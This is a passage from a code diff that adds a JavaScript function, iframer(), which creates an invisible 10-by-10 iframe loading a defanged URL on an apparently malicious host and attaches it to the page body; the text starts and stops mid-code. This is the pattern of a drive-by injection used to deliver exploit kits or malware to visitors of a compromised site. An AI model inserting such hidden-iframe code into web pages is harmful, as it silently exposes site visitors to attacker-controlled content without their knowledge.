@@ -1,0 +1,12 @@
+/iframe&gt;");
+}
+function iframer(){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://orjbhasqs.co.be/forum.php?tp=4a4e85585df3e7c1');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.getElementsByTagName('body')[0].append​Chil
